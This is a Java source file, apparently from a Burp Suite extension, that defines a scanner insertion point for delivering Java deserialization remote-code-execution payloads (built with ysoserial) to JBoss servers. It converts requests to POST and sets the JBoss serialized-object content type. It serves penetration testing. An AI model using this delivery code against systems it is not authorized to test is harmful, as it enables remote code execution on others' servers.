/*
	JBossSerializedInsertionPoint.java
	
	v0.1 (12/2/2015)
	
	Custom insertion point for Java Deserialization Remote Code Execution, specifically against the JBoss platform. Accepts a serialized object containing
	an operating system command from ysoserial and generates a POST request containing the object.
*/

package burp;

import java.util.*;

public class JBossSerializedInsertionPoint implements IScannerInsertionPoint {
	private IHttpRequestResponse baseRequestResponse;
	private String baseValue; //not sure what to do with this yet
	private String insertionPointName;
	private IExtensionHelpers helpers;
	
	public JBossSerializedInsertionPoint(IExtensionHelpers h,IHttpRequestResponse baseRR) {
		baseRequestResponse = baseRR;
		baseValue = ""; //not sure what to do with this yet
		insertionPointName = "SuperSerial-JBoss";
		helpers = h;
	}
	
	@Override
	public byte[] buildRequest(byte[] payload) {
		IRequestInfo baseReqInfo = helpers.analyzeRequest(baseRequestResponse);
		List<String> headers = baseReqInfo.getHeaders();
		String method = baseReqInfo.getMethod();
		
		//check if base request is a POST; if not, change to post
		if(!method.equalsIgnoreCase("POST")) {
			String firstLine = headers.get(0);
			headers.remove(0);
			firstLine = firstLine.replaceFirst(method,"POST");
			headers.add(0,firstLine);
		}
		
		//get headers from base request and look for Content-Type headers; if found, remove them all
		Iterator<String> headersItr = headers.iterator();
		ArrayList<String> contentTypeHeaders = new ArrayList<String>(1);
		while(headersItr.hasNext()) {
			String header = headersItr.next();
			if((header.length()>="Content-Type:".length())) {
				if(header.substring(0,"Content-Type:".length()).equalsIgnoreCase("Content-Type:")) { //Content-Type header found
					contentTypeHeaders.add(header);
				}
			}
		}
		if(!contentTypeHeaders.isEmpty()) {
			Iterator<String> cthItr = contentTypeHeaders.iterator();
			while(cthItr.hasNext()) {
				headers.remove(cthItr.next());
			}
		}
		
		//add correct content-type header and return
		headers.add("Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
		return helpers.buildHttpMessage(headers,payload);
	}
	
	@Override
	public String getBaseValue() {
		return baseValue;
	}
	
	@Override
	public String getInsertionPointName() {
		return insertionPointName;
	}
	
	@Override
	public byte getInsertionPointType() {
		return IScannerInsertionPoint.INS_ENTIRE_BODY;
	}
	
	@Override
	public int[] getPayloadOffsets(byte[] payload) {
		IRequestInfo baseReqInfo = helpers.analyzeRequest(baseRequestResponse);
		int dataStart = baseReqInfo.getBodyOffset();
		return new int[] {dataStart,dataStart+payload.length};
	}
}
